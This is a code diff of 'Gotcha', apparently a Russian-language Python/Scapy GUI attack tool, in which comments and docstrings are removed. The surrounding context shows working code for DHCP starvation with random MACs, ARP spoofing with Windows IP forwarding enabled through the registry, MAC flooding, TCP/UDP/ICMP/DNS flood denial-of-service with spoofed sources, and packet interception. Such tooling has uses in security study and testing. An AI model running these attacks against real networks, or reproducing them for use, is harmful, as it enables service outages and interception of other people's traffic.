@@ -14,7 +14,7 @@ import platform
 import ctypes
 import sys
 import json
-import winreg  # для работы с реестром (IP forwarding)
+import winreg                                         
 from scapy.all import *
 from scapy.layers.dhcp import DHCP, BOOTP
 from scapy.layers.l2 import ARP, Ether, Dot1Q
@@ -22,14 +22,6 @@ from scapy.layers.inet import IP, TCP, UDP, ICMP
 from scapy.layers.dns import DNS, DNSQR
 
 def find_exe(exe_name):
-    """
-    Ищет исполняемый файл в нескольких стандартных местах:
-    1. В папке exe/ рядом с исполняемым файлом (или скриптом)
-    2. В той же папке, что и исполняемый файл (или скрипт)
-    3. В папке exe/ в текущем рабочем каталоге
-    4. В текущем рабочем каталоге
-    Возвращает полный путь, если файл найден, иначе None.
-    """
     if getattr(sys, 'frozen', False):
         base_dir = os.path.dirname(sys.executable)
     else:
@@ -869,7 +861,7 @@ class Gotcha:
         
         self.theme_manager = Theme(self.root)
         
-        # Флаги состояния
+                         
         self.custom_stop_event = None
         self.custom_external_thread = None
         self.current_external_process = None
@@ -884,33 +876,32 @@ class Gotcha:
         self.last_offer_time = {}
         self.last_ack_time = {}
         
-        # Словарь для отслеживания внешних процессов (ключ -> (process, stop_event))
+                                                                                    
         self.external_processes = {}
         self.captured_packet = None
         self.intercept_thread = None
         self.selected_packet = None
         self.intercept_packets = []
         self.edited_packet = None
-        # Движки атак
+                     
         self.raw_attack = RSattack()
         self.scapy_attack = Sattack()
         
-        # Сетевые интерфейсы
+                            
         self.network_interfaces = self.get_interface_list()
         
-        # Определяем активный интерфейс (с ненулевым IP)
+                                                        
         self.active_interface = self.get_active_interface()
         
-        # Настройка GUI
+                       
         self.setup_gui()
         self.theme_manager.apply_theme("dark")
         
-        # Мониторинг системы
+                            
         self.system_monitor_running = True
         self.setup_system_monitor()
     
     def get_active_interface(self):
-        """Возвращает имя первого интерфейса с ненулевым IP-адресом (не 0.0.0.0)."""
         for iface in self.network_interfaces:
             try:
                 ip = get_if_addr(iface)
@@ -918,7 +909,7 @@ class Gotcha:
                     return iface
             except:
                 continue
-        # Если не нашли, возвращаем первый из списка
+                                                    
         return self.network_interfaces[0] if self.network_interfaces else "Ethernet"
     
     def setup_system_monitor(self):
@@ -1014,7 +1005,7 @@ class Gotcha:
                                   font=('Arial', 8), width=12)
         self.ram_label.pack(side='right', padx=(2, 10))
     
-    # ----- Access Tab -----
+                            
     def setup_access_tab(self, parent):
         main_frame = ttk.Frame(parent)
         main_frame.pack(fill='both', expand=True, padx=8, pady=8)
@@ -1057,7 +1048,6 @@ class Gotcha:
                   command=lambda: self.save_log(self.access_output), width=14).pack(pady=4)
     
     def net_scan(self):
-        """Быстрое ARP-сканирование локальной сети (все адреса, результат целиком)."""
         def scan_worker():
             ip = self.access_ip.get().strip()
             if not ip:
@@ -1084,7 +1074,7 @@ class Gotcha:
                 self.access_output.insert('end', f"Ошибка сканирования: {e}\n")
                 return
 
-            # Небольшая пауза для сбора запоздалых ответов
+                                                          
             time.sleep(0.5)
 
             self.access_output.insert('end', "\n" + "="*60 + "\n")
@@ -1257,7 +1247,7 @@ class Gotcha:
         except Exception as e:
             return f"Ошибка получения сетевых адаптеров: {str(e)}"
 
-    # ----- DHCP Starvation Tab -----
+                                     
     def setup_dhcp_tab(self, parent):
         main_frame = ttk.Frame(parent)
         main_frame.pack(fill='both', expand=True, padx=8, pady=8)
@@ -1368,7 +1358,7 @@ class Gotcha:
             'last_sent': 0
         }
         self.dhcp_offered_ips = set()
-        self.dhcp_offers = {}  # xid -> offered_ip
+        self.dhcp_offers = {}                     
         self.dhcp_lock = threading.Lock()
         self.dhcp_sniff_stop = None
         self.dhcp_sniff_thread = None
@@ -1402,7 +1392,7 @@ class Gotcha:
             self.dhcp_offered_ips.clear()
             self.dhcp_offers.clear()
         
-        # Запуск потока сниффера для сбора DHCP Offer и ACK
+                                                           
         self.dhcp_sniff_stop = threading.Event()
         self.dhcp_sniff_thread = threading.Thread(target=self.dhcp_sniff_worker, args=(self.dhcp_interface.get(),))
         self.dhcp_sniff_thread.daemon = True
@@ -1431,13 +1421,13 @@ class Gotcha:
                     if opt[0] == 'message-type':
                         msg_type = opt[1]
                         break
-                if msg_type == 2:  # Offer
+                if msg_type == 2:         
                     try:
                         xid = pkt[BOOTP].xid
                         offered_ip = pkt[BOOTP].yiaddr
                         if offered_ip != '0.0.0.0':
                             now = time.time()
-                            # Игнорируем повторный Offer для того же xid в течение 0.5 сек
+                                                                                          
                             if xid in self.last_offer_time and (now - self.last_offer_time[xid]) < 0.5:
                                 return False
                             self.last_offer_time[xid] = now
@@ -1446,7 +1436,7 @@ class Gotcha:
                             self.dhcp_log.insert('end', f"[OFFER] IP {offered_ip} для xid {xid}\n")
                     except:
                         pass
-                elif msg_type == 5:  # ACK
+                elif msg_type == 5:       
                     try:
                         xid = pkt[BOOTP].xid
                         ip = pkt[BOOTP].yiaddr
@@ -1478,7 +1468,7 @@ class Gotcha:
         
         total_time = time.time() - self.dhcp_stats['start_time']
         total_packets = self.dhcp_stats['sent_packets']
-        total_bytes = total_packets * 590  # approx packet size
+        total_bytes = total_packets * 590                      
         
         self.dhcp_log.insert('end', "\n--- Results ---\n")
         self.dhcp_log.insert('end', f"Total packets sent: {total_packets}\n")
@@ -1527,7 +1517,6 @@ class Gotcha:
             self.root.after(1000, self.update_dhcp_stats)
     
     def dhcp_attack_worker(self, interface, pool_size, request_count, delay, offer_timeout, ack_timeout):
-        """Улучшенная атака с настраиваемыми таймаутами Offer и ACK."""
         try:
             packet_count = 0
             used_macs = set()
@@ -1537,12 +1526,12 @@ class Gotcha:
                 if mac in used_macs:
                     continue
                 used_macs.add(mac)
-                self.dhcp_stats['unique_macs'].add(mac)   # Добавляем в статистику
+                self.dhcp_stats['unique_macs'].add(mac)                           
                 used_macs.add(mac)
                 mac_bytes = bytes.fromhex(mac.replace(':', ''))
                 xid = random.randint(1, 0xFFFFFFFF)
                 
-                # 1. Отправляем DISCOVER
+                                        
                 dhcp_discover = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
                             IP(src="0.0.0.0", dst="255.255.255.255") / \
                             UDP(sport=68, dport=67) / \
@@ -1553,7 +1542,7 @@ class Gotcha:
                 packet_count += 1
                 self.dhcp_stats['sent_packets'] = packet_count
                 
-                # Ждём Offer с увеличенным таймаутом
+                                                    
                 offer_deadline = time.time() + offer_timeout
                 offered_ip = None
                 while time.time() < offer_deadline and self.dhcp_attack_running:
@@ -1561,10 +1550,10 @@ class Gotcha:
                         if xid in self.dhcp_offers:
                             offered_ip = self.dhcp_offers.pop(xid)
                             break
-                    time.sleep(0.1)  # проверяем каждые 0.1 сек
+                    time.sleep(0.1)                            
                 
                 if offered_ip:
-                    # 2. Отправляем REQUEST
+                                           
                     dhcp_request = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
                                 IP(src="0.0.0.0", dst="255.255.255.255") / \
                                 UDP(sport=68, dport=67) / \
@@ -1576,7 +1565,7 @@ class Gotcha:
                     packet_count += 1
                     self.dhcp_stats['sent_packets'] = packet_count
                     
-                    # Ждём ACK с отдельным таймаутом
+                                                    
                     ack_deadline = time.time() + ack_timeout
                     ack_received = False
                     while time.time() < ack_deadline and self.dhcp_attack_running:
@@ -1604,7 +1593,7 @@ class Gotcha:
             self.dhcp_log.insert('end', f"DHCP Starvation error: {str(e)}\n")
             self.stop_dhcp_attack()
 
-    # ----- ARP Spoofing Tab -----
+                                  
     def setup_arp_spoof_tab(self, parent):
         main_frame = ttk.Frame(parent)
         main_frame.pack(fill='both', expand=True, padx=8, pady=8)
@@ -1750,7 +1739,7 @@ class Gotcha:
         
         total_time = time.time() - self.arp_spoof_stats['start_time']
         total_packets = self.arp_spoof_stats['sent_packets']
-        total_bytes = total_packets * 42  # approx ARP packet size
+        total_bytes = total_packets * 42                          
         
         self.arp_spoof_log.insert('end', "\n--- Results ---\n")
         self.arp_spoof_log.insert('end', f"Total packets sent: {total_packets}\n")
@@ -1764,7 +1753,6 @@ class Gotcha:
         self.status_var.set("ARP Spoofing остановлен")
     
     def enable_ip_forward(self, enable):
-        """Включение/отключение IP forwarding в Windows."""
         try:
             key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                  r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
@@ -1780,7 +1768,6 @@ class Gotcha:
             self.arp_spoof_log.insert('end', f"Не удалось изменить IP forwarding: {e}\n")
     
     def restore_arp(self):
-        """Отправка правильных ARP-ответов для восстановления."""
         try:
             target_ip = self.arp_target_ip.get()
             gateway_ip = self.arp_gateway_ip.get()
@@ -1801,7 +1788,6 @@ class Gotcha:
             self.arp_spoof_log.insert('end', f"Ошибка восстановления ARP: {e}\n")
     
     def get_mac_by_ip(self, ip, iface):
-        """Получить MAC-адрес по IP через ARP-запрос."""
         try:
             ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0, iface=iface)
             for _, rcv in ans:
@@ -1868,7 +1854,7 @@ class Gotcha:
         except Exception as e:
             self.arp_spoof_log.insert('end', f"ARP Spoofing error: {str(e)}\n")
 
-    # ----- MAC Flood Tab -----
+                               
     def setup_mac_flood_tab(self, parent):
         main_frame = ttk.Frame(parent)
         main_frame.pack(fill='both', expand=True, padx=8, pady=8)
@@ -2052,7 +2038,7 @@ class Gotcha:
         self.mac_start_btn.config(state='normal')
         self.mac_stop_btn.config(state='disabled')
 
-    # ----- DoS Attack Tab (Custom) -----
+                                         
     def setup_custom_attack_tab(self, parent):
         main_frame = ttk.Frame(parent)
         main_frame.pack(fill='both', expand=True, padx=8, pady=8)
@@ -2066,7 +2052,7 @@ class Gotcha:
         params_frame = ttk.LabelFrame(left_frame, text="Параметры DoS атаки")
         params_frame.pack(fill='x', padx=5, pady=5)
         
-        # Целевой IP
+                    
         row1 = ttk.Frame(params_frame)
         row1.pack(fill='x', padx=5, pady=5)
         ttk.Label(row1, text="IP адрес:", width=12).pack(side='left', padx=2)
@@ -2074,7 +2060,7 @@ class Gotcha:
         self.custom_ip.pack(side='left', padx=2)
         self.custom_ip.insert(0, "192.168.1.1")
         
-        # Протокол
+                  
         row2 = ttk.Frame(params_frame)
         row2.pack(fill='x', padx=5, pady=5)
         ttk.Label(row2, text="Протокол:", width=12).pack(side='left', padx=2)
@@ -2085,7 +2071,7 @@ class Gotcha:
         self.custom_protocol.set("TCP")
         self.custom_protocol.bind('<<ComboboxSelected>>', self.on_protocol_change)
         
-        # Порт (будет скрыт для некоторых протоколов)
+                                                     
         self.custom_port_frame = ttk.Frame(params_frame)
         self.custom_port_frame.pack(fill='x', padx=5, pady=5)
         ttk.Label(self.custom_port_frame, text="Порт:", width=12).pack(side='left', padx=2)
@@ -2093,7 +2079,7 @@ class Gotcha:
         self.custom_port.pack(side='left', padx=2)
         self.custom_port.insert(0, "80")
         
-        # Размер пакета
+                       
         row4 = ttk.Frame(params_frame)
         row4.pack(fill='x', padx=5, pady=5)
         ttk.Label(row4, text="Размер пакета:", width=12).pack(side='left', padx=2)
@@ -2102,7 +2088,7 @@ class Gotcha:
         self.custom_packet_size.insert(0, "1024")
         ttk.Label(row4, text="байт").pack(side='left', padx=2)
         
-        # Время (сек)
+                     
         row5 = ttk.Frame(params_frame)
         row5.pack(fill='x', padx=5, pady=5)
         ttk.Label(row5, text="Время (сек):", width=12).pack(side='left', padx=2)
@@ -2111,16 +2097,16 @@ class Gotcha:
         self.custom_packet_count.insert(0, "60")
         ttk.Label(row5, text="0 = бесконечно").pack(side='left', padx=6)
         
-        # Фрейм для дополнительных опций (случайный IP/MAC)
+                                                           
         self.custom_options_frame = ttk.Frame(params_frame)
         self.custom_random_ip = tk.BooleanVar(value=False)
         self.custom_random_mac = tk.BooleanVar(value=False)
         ttk.Checkbutton(self.custom_options_frame, text="Случайный IP", variable=self.custom_random_ip).pack(side='left', padx=5)
         ttk.Checkbutton(self.custom_options_frame, text="Случайный MAC", variable=self.custom_random_mac).pack(side='left', padx=5)
         self.custom_options_frame.pack(fill='x', padx=5, pady=5)
-        self.custom_options_frame.pack_forget()  # изначально скрыт
+        self.custom_options_frame.pack_forget()                    
         
-        # Интерфейс
+                   
         self.custom_row7 = ttk.Frame(params_frame)
         self.custom_row7.pack(fill='x', padx=5, pady=5)
         ttk.Label(self.custom_row7, text="Интерфейс:", width=12).pack(side='left', padx=2)
@@ -2128,7 +2114,7 @@ class Gotcha:
         self.custom_interface.pack(side='left', padx=2)
         self.custom_interface.set(self.active_interface)
         
-        # Кнопки
+                
         button_frame = ttk.Frame(params_frame)
         button_frame.pack(fill='x', padx=5, pady=10)
         
@@ -2140,7 +2126,7 @@ class Gotcha:
                                         command=self.stop_custom_attack, width=15, state='disabled')
         self.custom_stop_btn.pack(side='left', padx=5)
         
-        # Статистика
+                    
         stats_frame = ttk.LabelFrame(left_frame, text="Статистика")
         stats_frame.pack(fill='x', padx=5, pady=5)
         
@@ -2159,7 +2145,7 @@ class Gotcha:
         self.custom_time = ttk.Label(stats_grid, text="00:00:00", width=15, anchor='w')
         self.custom_time.grid(row=2, column=1, padx=5, pady=2, sticky='w')
         
-        # Лог
+             
         log_frame = ttk.LabelFrame(right_frame, text="Лог DoS атаки")
         log_frame.pack(fill='both', expand=True, padx=5, pady=5)
         
@@ -2180,20 +2166,20 @@ class Gotcha:
             'total_bytes': 0
         }
         
-        # Начальное состояние протокола
+                                       
         self.on_protocol_change()
     
     def on_protocol_change(self, event=None):
         proto = self.custom_protocol.get()
         
-        # Управление видимостью поля "Порт"
+                                           
         if proto in ["TCP", "UDP"]:
             self.custom_port_frame.pack(fill='x', padx=5, pady=5, before=self.custom_options_frame
                                         if self.custom_options_frame.winfo_ismapped() else self.custom_row7)
         else:
             self.custom_port_frame.pack_forget()
         
-        # Управление видимостью дополнительных опций (случайный IP/MAC)
+                                                                       
         if proto in ["TCP", "ARP", "ICMP"]:
             self.custom_options_frame.pack(fill='x', padx=5, pady=5, before=self.custom_row7)
         else:
@@ -2285,11 +2271,11 @@ class Gotcha:
             if duration < 0:
                 raise ValueError("Время атаки не может быть отрицательным")
             
-            # Сохраняем тип атаки
+                                 
             self.current_attack_type = protocol
             self.external_infinite = continuous and protocol in ["TCP", "ARP", "ICMP"]
             
-            # Очищаем лог и выводим минимальную информацию
+                                                          
             self.custom_log.delete(1.0, tk.END)
             self.custom_log.insert('end', f"{protocol} flood started\n")
             self.custom_log.insert('end', f"Target: {target_ip}" + (f":{port}" if protocol in ["TCP","UDP"] else "") + "\n")
@@ -2387,7 +2373,7 @@ class Gotcha:
                     on_complete=lambda: self.root.after(0, self.on_internal_finished)
                 )
             
-            # Для внутренних атак запускаем обновление статистики
+                                                                 
             if protocol in ["UDP", "DNS"]:
                 self.custom_attack_stats = {
                     'start_time': time.time(),
@@ -2449,7 +2435,6 @@ class Gotcha:
         self.external_infinite = False
     
     def on_external_finished(self):
-        """Вызывается после завершения внешнего процесса (по таймеру или по Enter)."""
         self.custom_attack_running = False
         self.custom_start_btn.config(state='normal')
         self.custom_stop_btn.config(state='disabled')
@@ -2459,7 +2444,7 @@ class Gotcha:
         if not self.custom_attack_running:
             return
 
-        # Если это внешняя атака и процесс ещё жив
+                                                  
         if self.current_attack_type in ["TCP", "ARP", "ICMP"]:
             key = self.current_attack_type.lower()
             proc_info = self.external_processes.get(key)
@@ -2478,7 +2463,7 @@ class Gotcha:
                     except subprocess.TimeoutExpired:
                         proc.kill()
 
-        # Если это внутренняя атака, останавливаем движки и выводим статистику
+                                                                              
         if self.current_attack_type in ["UDP", "DNS"]:
             if self.raw_attack.running:
                 final_stats = self.raw_attack.stop()
@@ -2488,7 +2473,7 @@ class Gotcha:
                 final_stats = None
             self._show_internal_results(final_stats)
 
-        # Сбрасываем флаги
+                          
         self.custom_attack_running = False
         self.custom_start_btn.config(state='normal')
         self.custom_stop_btn.config(state='disabled')
@@ -2523,7 +2508,7 @@ class Gotcha:
         if self.custom_attack_running:
             self.root.after(1000, self.update_custom_attack_stats)
 
-    # ----- Packet Intercept Tab -----
+                                      
     def setup_intercept_tab(self, parent):
         main_frame = ttk.Frame(parent)
         main_frame.pack(fill='both', expand=True, padx=8, pady=8)
@@ -2815,7 +2800,7 @@ class Gotcha:
             self.intercept_log.insert('end', f"Ошибка создания ответа: {str(e)}\n")
         return None
 
-    # ----- Settings Tab -----
+                              
     def setup_settings_tab(self, parent):
         main_frame = ttk.Frame(parent)
         main_frame.pack(fill='both', expand=True, padx=8, pady=8)
@@ -3022,7 +3007,7 @@ Start-Service RemoteAccess
         close_btn.pack(pady=10)
         self.theme_manager.apply_to_widgets(help_window, self.theme_manager.themes[self.theme_manager.current_theme])
     
-    # ----- Utility -----
+                         
     def generate_random_mac(self):
         return "%02x:%02x:%02x:%02x:%02x:%02x" % (
             random.randint(0, 255), random.randint(0, 255),
@@ -3031,7 +3016,7 @@ Start-Service RemoteAccess
         )
     
     def on_closing(self):
-        # Останавливаем все активные атаки
+                                          
         if self.custom_attack_running:
             self.stop_custom_attack()
         if self.dhcp_attack_running:
@@ -3042,7 +3027,7 @@ Start-Service RemoteAccess
             self.stop_packet_intercept()
         if self.mac_attack_running:
             self.stop_mac_flood()
-        # Принудительно завершаем все внешние процессы, если остались
+                                                                     
         for key, (proc, stop_event) in list(self.external_processes.items()):
             stop_event.set()
             if proc.poll() is None:
